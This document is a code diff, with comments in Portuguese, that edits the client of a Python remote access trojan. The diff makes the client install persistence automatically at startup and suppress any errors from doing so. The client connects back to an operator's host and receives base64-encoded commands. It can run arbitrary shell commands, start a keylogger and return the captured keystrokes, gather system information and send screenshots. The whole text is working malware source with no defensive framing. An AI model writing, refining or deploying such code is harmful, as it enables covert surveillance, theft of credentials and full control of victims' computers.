@@ -1,13 +1,35 @@
-class CLIENT:
+import os
+import socket
+import subprocess
+import threading
+import time
+import base64
+from persistence import PERSISTENCE
+from sysinfo import SYSINFO
+from screenshot import SCREENSHOT
 
+# Verifica se está rodando em Windows (para permitir keylogger/screenshot com segurança)
+HAVE_X = os.name == 'nt'
+
+if HAVE_X:
+    from pynput.keyboard import Listener
+
+
+class CLIENT:
     SOCK = None
-    KEY  = ")J@NcRfU"
+    KEY = ")J@NcRfU"
     KEYLOGGER_STATUS = False
     KEYLOGGER_STROKES = ""
 
     def __init__(self, _ip, _pt):
         self.ipaddress = _ip
-        self.port      = _pt
+        self.port = _pt
+
+        # Ativar persistência automaticamente ao iniciar
+        try:
+            PERSISTENCE()
+        except:
+            pass
 
     def send_data(self, tosend, encode=True):
         if encode:
@@ -31,7 +53,7 @@ class CLIENT:
                 if not self.KEYLOGGER_STATUS:
                     return False
 
-            def logger():            
+            def logger():
                 with Listener(on_press=on_press, on_release=on_release) as listener:
                     listener.join()
 
@@ -48,27 +70,22 @@ class CLIENT:
         data = command.decode('utf-8').split(":")
 
         if data[0] == "shell":
-
-            #print("Executing Shell: " + data[1])
-            toexecute = data[1].rstrip(" ").lstrip(" ")
-            toexecute = " ".join(toexecute.split())
-            if toexecute.split(" ")[0] == "cd":
+            toexecute = data[1].strip()
+            if toexecute.startswith("cd "):
                 try:
-                    os.chdir(toexecute.split(" ")[1])
+                    os.chdir(toexecute.split(" ", 1)[1])
                     self.send_data("")
-                except:
-                    self.send_data("Error while changing directory!")
+                except Exception as e:
+                    self.send_data("Erro ao mudar diretório: " + str(e))
             else:
                 try:
-                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-                    output, errors = comm.communicate()
+                    proc = subprocess.Popen(toexecute, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                    output, errors = proc.communicate()
                     self.send_data(output + errors)
-                except FileNotFoundError:
-                    self.send_data("No Such File or Directory")
+                except Exception as e:
+                    self.send_data("Erro ao executar comando: " + str(e))
 
         elif data[0] == "keylogger" and HAVE_X:
-
-            #print("Executing Keylogger: " + data[1])
             if data[1] == "on":
                 self.turn_keylogger(True)
                 self.send_data("")
@@ -79,44 +96,40 @@ class CLIENT:
                 self.send_data(self.KEYLOGGER_STROKES)
 
         elif data[0] == "sysinfo":
-
-            #print("Executing Sysinfo: " + data[1])
-            sysinfo = SYSINFO()
-            self.send_data(sysinfo.get_data())
+            info = SYSINFO()
+            self.send_data(info.get_data())
 
         elif data[0] == "screenshot":
-
-            #print("Executing Screenshot: " + data[1])
-            screenshot = SCREENSHOT()
-            self.send_data(screenshot.get_data(), encode=False)
+            shot = SCREENSHOT()
+            self.send_data(shot.get_data(), encode=False)
 
     def acceptor(self):
         data = ""
         chunk = b""
 
         while True:
-            chunk = self.SOCK.recv(4096)
-            if not chunk:
-                break
-            data += chunk.decode('utf-8')
+            try:
+                chunk = self.SOCK.recv(4096)
+                if not chunk:
+                    break
+                data += chunk.decode('utf-8')
 
-            if self.KEY.encode('utf-8') in chunk:
-                data = data.rstrip(self.KEY)
-                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
-                t.daemon = True
-                t.start()
-                data = ""
+                if self.KEY.encode('utf-8') in chunk:
+                    data = data.rstrip(self.KEY)
+                    t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
+                    t.daemon = True
+                    t.start()
+                    data = ""
+            except:
+                break
 
     def engage(self):
         self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
+
         while True:
             try:
-                # print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                 self.SOCK.connect((self.ipaddress, self.port))
+                self.acceptor()
             except:
-                # print("Failed to Connect. Trying Again!")
                 time.sleep(5)
                 continue
-
-            self.acceptor()
